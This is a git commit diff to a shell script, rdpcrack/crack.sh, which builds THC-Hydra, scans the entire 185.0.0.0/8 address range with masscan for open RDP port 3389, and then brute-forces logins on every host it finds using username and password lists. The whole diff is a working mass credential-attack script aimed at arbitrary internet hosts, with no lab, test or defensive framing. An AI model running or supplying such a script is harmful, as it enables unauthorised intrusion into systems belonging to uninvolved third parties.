b0914902ba9a67704b3c7ce1b992d40385f6fe1c
Remi Girard <54126451+independentcod@users.noreply.github.com>
2020-04-04 16:12:01 -0400

    Update crack.sh

--- rdpcrack/crack.sh
+++ rdpcrack/crack.sh
@@ -1,4 +1,8 @@
-#sudo masscan --range 185.0.0.0-185.255.255.255 --rate 5000 -p3389 --open --banners -oG rdp.scan;
-rm -rf hydra.log;
+sudo apt update && sudo apt install build-essential freerdp2-dev -y;
+git clone https://github.com/vanhauser-thc/thc-hydra.git;
+cd thc-hydra;
+./configure && make -j8 && sudo make install;
+cd ..;
+sudo masscan --range 185.0.0.0-185.255.255.255 --rate 5000 -p3389 --open --banners -oG rdp.scan;
 for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" rdp.scan`; do hydra -vv rdp://$i -L user -P pass -t1 -W1 -I >hydra.log;
 done
